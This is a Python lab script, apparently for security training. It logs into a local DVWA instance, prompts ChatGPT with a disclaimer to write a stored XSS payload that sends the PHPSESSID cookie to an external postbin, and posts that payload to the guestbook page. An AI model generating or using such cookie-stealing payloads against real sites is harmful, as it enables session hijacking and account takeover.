"""
Identifying and Exploiting XSS Vulnerabilities with ChatGPT
Data Exfiltration and Session Hijacking
['Utilize ChatGPT to automate the creation of scripts for data exfiltration through XSS vulnerabilities.', 'Apply ChatGPT to generate payloads for session hijacking, focusing on stealth and efficiency.', 'Implement ChatGPT to develop strategies for bypassing same-origin policies and other browser security mechanisms.', 'Use ChatGPT to simulate attacks and test the robustness of session management and data handling practices.']
This script is for training purposes only
"""
import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_data_exfiltration_and_session_hijacking(DVWA_Session,ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self) 
        General_Func.__init__(self)
    
    def xss_data_exfiltration_script(self, url, s, payload):
        # Post to Stored XSS page
        xss_data = {
            'txtName': 'Thankyou for your session id',
            'mtxMessage': payload,
            'btnSign': 'Sign+Guestbook'
        }

        response = s.post(url, xss_data)
        return response

    def generate_session_hijacking_payload(self):
        # Generate payload for session hijacking
        payload_content = self.red_team_query(
            # Create GET bin at https://www.toptal.com/developers/postbin
            "Create a stored xss payload to send the cookie PHPSESSID via GET request to https://www.toptal.com/developers/postbin/1111111111?data=",
            f"{self.phishing_disclaimer},{self.no_markdown}"
        )
        return payload_content

def main():
    ai = PointlessAI_data_exfiltration_and_session_hijacking() # Instantiate class
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.get_constants())
        _ = ai.login_to_dvwa(s, ai.get_constants(), 'admin', 'password', user_token)
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.base_url+"/setup.php")
        _ = ai.setup_database(s, ai.base_url+"/setup.php", user_token, cookies)

        # Begin testing for Data Exfiltration and Session Hijacking
        url = "http://127.0.0.1/vulnerabilities/xss_s/"

        # Generate payload
        payload = ai.generate_session_hijacking_payload()
        
        # Test Data Exfiltration through XSS
        response = ai.xss_data_exfiltration_script(url, s, payload)
        print(response.text)
        
if __name__ == "__main__":
    main()